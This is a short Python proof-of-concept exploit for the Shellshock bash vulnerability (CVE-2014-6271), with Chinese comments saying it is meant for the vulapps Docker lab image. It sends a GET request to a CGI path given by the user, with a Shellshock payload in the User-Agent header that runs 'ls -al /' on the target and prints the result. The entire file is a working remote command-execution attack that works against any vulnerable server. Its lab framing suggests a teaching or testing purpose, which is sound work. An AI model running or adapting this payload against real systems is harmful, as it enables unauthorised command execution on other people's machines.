#!/usr/bin/env python
# -*- coding: utf-8 -*-
# python version 3.6.4
# 简介：
# 脚本适用于docker下的vulapps环境，使用
# docker run -d -p 80:80 medicean/vulapps:b_bash_shellshock1
# 可直接运行。
# 具体信息参见github地址
# https://github.com/Medicean/VulApps/tree/master/b/bash/shellshock1_CVE-2014-6271

import sys
import http.client

argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == 0 or argc > 3:
    print("用法：python",sys.argv[0],"IP地址 端口号 路径")
    print("例如：url为http://127.0.0.1/cgi-bin/poc.cgi，则IP地址应为192.168.13.129，端口号应为80，路径应为/cgi-bin/poc.cgi")
    sys.exit()

ip = "127.0.0.1"
port = 80
url = "/cgi-bin/poc.cgi"

if argc >= 1:
    ip = argv[0]
if argc >= 2:
    port = argv[1]
if argc == 3:
    url = argv[2]

try:
    conn = http.client.HTTPConnection(ip, port)
except http.client.HTTPException as e:
    print(e.__cause__)

try:
    header = {"User-Agent": "() { :;}; echo;echo $(/bin/ls -al / );"}
    conn.request("GET", url, "", header)
    resp = conn.getresponse()
    print(resp.status, resp.reason)
    print(str(resp.read(), "utf8"))
except http.client.HTTPException as e:
    print(e.__cause__)
